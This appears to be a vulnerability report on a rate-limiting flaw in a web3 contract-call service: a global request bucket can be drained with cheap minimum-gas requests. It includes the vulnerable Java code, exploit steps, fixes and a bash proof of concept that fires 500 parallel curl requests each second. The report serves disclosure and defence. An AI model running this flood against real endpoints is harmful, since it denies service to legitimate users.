### Title
Global Rate-Limit Bucket Exhaustion via Minimum-Gas Requests (Asymmetric DoS)

### Summary
The `throttle()` method in `ThrottleManagerImpl` enforces two independent global token-bucket limits — a request-rate bucket (`rateLimitBucket`, 500 tokens/s by default) and a gas bucket (`gasLimitBucket`, 750,000 scaled tokens/s by default). Because both buckets are process-wide singletons with no per-IP or per-user isolation, and because a request with `gas=21000` consumes only 2 scaled gas tokens while always consuming 1 rate token, a single unprivileged attacker can exhaust the entire `rateLimitBucket` (500 requests) while consuming only 0.13% of the `gasLimitBucket`, denying service to all other users.

### Finding Description

**Exact code path:**

`ThrottleManagerImpl.throttle()` (lines 37–49):
```java
if (!rateLimitBucket.tryConsume(1)) {           // always costs 1 rate token
    throw new ThrottleException(...);
} else if (!gasLimitBucket.tryConsume(
        throttleProperties.scaleGas(request.getGas()))) {  // costs scaleGas(gas) tokens
    throw new ThrottleException(...);
}
```

`ThrottleProperties.scaleGas()` (lines 42–47):
```java
public long scaleGas(long gas) {
    if (gas <= GAS_SCALE_FACTOR) {   // GAS_SCALE_FACTOR = 10_000
        return 0L;
    }
    return Math.floorDiv(gas, GAS_SCALE_FACTOR);
}
```

**Root cause — failed assumption:** The design assumes the gas bucket will be the binding constraint that prevents abuse. However, the two buckets are sized with a 1,500:1 ratio (750,000 gas tokens vs 500 rate tokens). For `gas=21000`, `scaleGas(21000) = Math.floorDiv(21000, 10000) = 2`. Each request therefore costs 1 rate token and only 2 gas tokens. To exhaust the rate bucket (500 tokens), an attacker needs 500 requests, consuming only 1,000 gas tokens — 0.13% of the gas budget.

**Both buckets are global singletons** (Spring `@Bean` in `ThrottleConfiguration`, lines 24–32 and 34–45). There is no per-IP, per-session, or per-user bucket. A single attacker monopolizes the shared global limit.

**No rate-token refund exists.** `restore()` (lines 59–64) refunds gas tokens after execution, but there is no corresponding refund for the rate token, so even failed/cheap requests permanently consume rate capacity.

**Exploit flow:**
1. Attacker sends a burst of 500 HTTP requests to the `eth_call` / `contractCall` endpoint with `gas=21000`.
2. Each request passes the gas check (2 tokens consumed, 749,998 remaining) and consumes 1 rate token.
3. After 500 requests, `rateLimitBucket` is empty; `gasLimitBucket` is at 99.87% capacity.
4. All subsequent requests from any user receive HTTP 429 `"Requests per second rate limit exceeded"` until the bucket refills (1 second).
5. The attacker repeats every second, maintaining a continuous DoS.

### Impact Explanation
Any unprivileged external user can continuously block 100% of legitimate traffic to the web3 JSON-RPC endpoint. The gas limit — the intended heavy-weight guard — is rendered irrelevant as a DoS protection mechanism. The service appears operational (the attacker's own requests succeed) while all other users are denied access. Severity is **High**: complete availability loss for the shared endpoint with no authentication or cost barrier to the attacker.

### Likelihood Explanation
The attack requires zero privileges, no special tooling, and no on-chain cost. A single HTTP client sending 500 requests/second (trivially achievable with `curl`, `ab`, `wrk`, or any scripting language) is sufficient. The attack is fully repeatable every second and is not detectable as anomalous by the existing throttle logic (the attacker's requests all succeed). No rate-limiting at a higher layer (e.g., per-IP nginx/load-balancer rules) is present in the application code.

### Recommendation
1. **Per-IP rate limiting:** Introduce a per-source-IP token bucket (e.g., using Bucket4j's distributed or local per-key buckets) so a single client cannot exhaust the global limit.
2. **Rebalance bucket ratios:** The `requestsPerSecond` limit (500) and the scaled gas limit (750,000) differ by 1,500×. Either raise the gas-token cost floor or lower the rate-limit ceiling so the gas bucket becomes the binding constraint for low-gas requests.
3. **Minimum gas token cost:** Change `scaleGas` to enforce a minimum of 1 token for any accepted request (i.e., remove the `return 0L` branch or raise the floor), so low-gas requests still consume a meaningful fraction of the gas budget relative to the rate budget.
4. **Rate-token refund on gas rejection:** If the gas check fails, refund the already-consumed rate token to prevent the rate bucket from being drained by requests that are ultimately rejected.

### Proof of Concept

```bash
# Exhaust the global rateLimitBucket in one second using minimum-gas requests
# Default config: requestsPerSecond=500, gasPerSecond=7_500_000_000

for i in $(seq 1 500); do
  curl -s -X POST http://<mirror-node-web3>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"from":"0x0000000000000000000000000000000000000001",
         "to":"0x0000000000000000000000000000000000000002",
         "gas":"0x5208",
         "data":"0x"}' &
done
wait

# All 500 requests succeed for the attacker (rateLimitBucket now empty, gasLimitBucket at 99.87%)
# Any subsequent request from a legitimate user within the same second receives:
# HTTP 429: {"_status":{"messages":[{"message":"Requests per second rate limit exceeded"}]}}

curl -X POST http://<mirror-node-web3>/api/v1/contracts/call \
  -H 'Content-Type: application/json' \
  -d '{"from":"0xlegitimate","to":"0xtarget","gas":"0x5F5E100","data":"0x"}'
# → 429 Too Many Requests
```

- `scaleGas(0x5208)` = `scaleGas(21000)` = `Math.floorDiv(21000, 10000)` = **2** gas tokens consumed per request
